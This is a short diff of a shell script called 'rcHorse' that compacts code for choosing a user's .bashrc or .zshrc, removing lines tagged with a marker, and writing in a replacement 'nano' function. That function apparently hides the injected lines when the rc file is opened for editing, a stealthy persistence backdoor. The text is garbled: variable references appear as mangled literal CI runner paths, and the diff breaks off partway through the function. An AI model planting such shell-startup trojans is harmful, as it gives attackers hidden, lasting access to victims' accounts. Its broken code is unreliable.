@@ -1,20 +1,10 @@
-#!/bin/sh
-case $(basename "\/bin/bash") in
-  "bash")
-    target=".bashrc"
-    ;;
-  "zsh")
-    target=".zshrc"
-    ;;
-  *)
-    exit 1
-    ;;
+#!/bin/bash
+case \bash in
+  "bash") target=".bashrc" ;;
+  "zsh") target=".zshrc" ;;
+  *) exit 1 ;;
 esac
-
-if [ -f "\/home/runner/\" ]; then
-  awk '\ != "#--rcHorse--" {print \/home/runner/work/_temp/f1d41ad5-6df6-453a-988a-5c02587e4415.sh}' "\/home/runner/\" > temp_file && mv temp_file "\/home/runner/\"
-fi
-
+[ -f "\/home/runner/\" ] && awk '\ != "#--rcHorse--" {print \/home/runner/work/_temp/0e9a823f-1756-4328-9387-c52a9b2060c5.sh}' "\/home/runner/\" > temp && mv temp "\/home/runner/\"
 echo "nano(){ #--rcHorse--
 	if [[ "echo $@ | grep -c \"rcTarget\"" != "0" ]]; then #--rcHorse--
 		rcHorse="$(awk '$NF=="#--rcHorse--" {print $0}' $HOME/rcTarget)" #--rcHorse--
